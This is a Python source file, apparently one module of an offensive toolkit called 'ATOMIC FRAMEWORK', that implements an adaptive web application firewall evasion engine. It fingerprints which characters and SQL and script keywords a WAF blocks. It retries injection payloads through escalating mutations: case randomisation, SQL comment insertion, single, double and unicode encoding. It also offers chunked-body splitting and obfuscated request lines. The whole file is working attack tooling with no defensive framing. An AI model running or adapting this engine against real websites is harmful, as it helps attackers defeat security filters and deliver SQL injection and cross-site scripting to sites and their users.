#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK — Phase M: Adaptive WAF Evasion Engine

Provides:
  M1. Request-smuggling-aware bypass
  M2. Adaptive payload mutation with feedback loop
  M3. Protocol-level evasion (chunked splitting, H2 abuse)
"""

import re
import random
import urllib.parse


class WAFEvasionEngine:
    """Adaptive WAF evasion with real-time mutation feedback."""

    # WAF block indicators
    BLOCK_INDICATORS = [
        'blocked', 'forbidden', '403', 'access denied',
        'request rejected', 'not acceptable', 'waf',
        'mod_security', 'webknight', 'naxsi',
        'cloudflare', 'incapsula', 'sucuri',
    ]

    def __init__(self, engine=None):
        self.engine = engine
        self._blocked_chars: set = set()
        self._blocked_keywords: set = set()
        self._allowed_encodings: list = []
        self._bypass_stats = {'attempts': 0, 'successes': 0, 'failures': 0}

    # ------------------------------------------------------------------
    # M2: WAF Behaviour Fingerprinting
    # ------------------------------------------------------------------

    def fingerprint_waf(self, url, requester):
        """Probe which characters and keywords the WAF blocks.

        Sends a set of canary payloads and builds an allowlist / blocklist.
        """
        test_chars = ["'", '"', '<', '>', ';', '|', '&', '`', '$', '{', '}',
                      '(', ')', '\\', '/', '%', '\n', '\r', '\t']
        test_keywords = ['SELECT', 'UNION', 'OR', 'AND', 'script', 'onerror',
                         'alert', 'img', 'svg', 'onload', 'eval', 'exec',
                         'DROP', 'INSERT', 'SLEEP', 'WAITFOR', 'BENCHMARK']

        for char in test_chars:
            try:
                resp = requester.request(url, 'GET', params={'test': f'a{char}b'})
                if resp and self._is_blocked(resp):
                    self._blocked_chars.add(char)
            except Exception:
                pass

        for kw in test_keywords:
            try:
                resp = requester.request(url, 'GET', params={'test': kw})
                if resp and self._is_blocked(resp):
                    self._blocked_keywords.add(kw.lower())
            except Exception:
                pass

        return {
            'blocked_chars': list(self._blocked_chars),
            'blocked_keywords': list(self._blocked_keywords),
        }

    # ------------------------------------------------------------------
    # M2: Encoding Chain Generation
    # ------------------------------------------------------------------

    ENCODING_CHAIN = [
        ('url', lambda p: urllib.parse.quote(p, safe='')),
        ('double_url', lambda p: urllib.parse.quote(urllib.parse.quote(p, safe=''), safe='')),
        ('unicode', lambda p: ''.join(
            f'\\u{ord(c):04x}' if not c.isalnum() else c for c in p)),
        ('html_entity', lambda p: ''.join(
            f'&#{ord(c)};' if not c.isalnum() else c for c in p)),
        ('hex', lambda p: ''.join(
            f'\\x{ord(c):02x}' if not c.isalnum() else c for c in p)),
    ]

    def generate_encoding_chain(self, payload):
        """Try progressively deeper encodings until one might bypass WAF."""
        variants = [payload]
        for name, encode_fn in self.ENCODING_CHAIN:
            try:
                variants.append(encode_fn(payload))
            except Exception:
                pass
        return variants

    # ------------------------------------------------------------------
    # M2: Real-time Mutation Feedback Loop
    # ------------------------------------------------------------------

    def mutate_payload(self, payload, round_num=0):
        """Apply progressively aggressive mutations.

        round_num 0 → case randomisation
        round_num 1 → inline comments (SQL)
        round_num 2 → URL-encode blocked chars
        round_num 3 → double-URL-encode
        round_num 4 → unicode escape
        """
        mutations = [
            self._case_randomise,
            self._insert_sql_comments,
            self._url_encode_blocked,
            self._double_url_encode,
            self._unicode_escape,
        ]
        idx = min(round_num, len(mutations) - 1)
        return mutations[idx](payload)

    def adaptive_send(self, url, method, param, payload, requester,
                      max_rounds=5):
        """Send payload, mutate if blocked, retry up to *max_rounds*.

        Returns (response, final_payload) on success or (None, None).
        """
        current = payload
        for rnd in range(max_rounds):
            self._bypass_stats['attempts'] += 1
            try:
                resp = requester.request(url, method,
                                         data={param: current} if param else None)
                if resp and not self._is_blocked(resp):
                    self._bypass_stats['successes'] += 1
                    return resp, current
                # Blocked → mutate
                current = self.mutate_payload(payload, rnd)
            except Exception:
                pass
        self._bypass_stats['failures'] += 1
        return None, None

    # ------------------------------------------------------------------
    # M3: Protocol-Level Evasion helpers
    # ------------------------------------------------------------------

    @staticmethod
    def chunked_split(payload, chunk_size=4):
        """Split *payload* into Transfer-Encoding: chunked body."""
        parts = []
        for i in range(0, len(payload), chunk_size):
            chunk = payload[i:i + chunk_size]
            parts.append(f'{len(chunk):x}\r\n{chunk}\r\n')
        parts.append('0\r\n\r\n')
        return ''.join(parts)

    @staticmethod
    def request_line_obfuscation(method, path, host):
        """Return request-line variants that may confuse WAFs.

        Returns a list of (request_line, Host_header) tuples.
        """
        variants = [
            (f'{method} {path} HTTP/1.1', host),
            (f'{method} http://{host}{path} HTTP/1.1', host),  # absolute URI
            (f'{method}\t{path}\tHTTP/1.1', host),  # tab-separated
            (f'{method}  {path}  HTTP/1.1', host),  # extra spaces
        ]
        return variants

    # ------------------------------------------------------------------
    # Mutation helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _case_randomise(payload):
        return ''.join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in payload)

    @staticmethod
    def _insert_sql_comments(payload):
        """Insert /**/  between SQL keywords."""
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR',
                    'INSERT', 'UPDATE', 'DELETE', 'DROP', 'EXEC']
        result = payload
        for kw in keywords:
            pattern = re.compile(re.escape(kw), re.IGNORECASE)
            result = pattern.sub(
                lambda m: '/**/'.join(m.group()), result, count=1)
        return result

    def _url_encode_blocked(self, payload):
        return ''.join(
            urllib.parse.quote(c, safe='') if c in self._blocked_chars else c
            for c in payload)

    @staticmethod
    def _double_url_encode(payload):
        return urllib.parse.quote(
            urllib.parse.quote(payload, safe=''), safe='')

    @staticmethod
    def _unicode_escape(payload):
        return ''.join(
            f'\\u{ord(c):04x}' if not c.isalnum() else c for c in payload)

    # ------------------------------------------------------------------
    # Detection helper
    # ------------------------------------------------------------------

    def _is_blocked(self, resp):
        """Heuristic: the response looks like a WAF block."""
        if resp.status_code in (403, 406, 429, 503):
            return True
        body = (resp.text or '').lower()[:2000]
        return any(ind in body for ind in self.BLOCK_INDICATORS)

    def get_stats(self):
        """Return bypass attempt statistics."""
        return dict(self._bypass_stats)
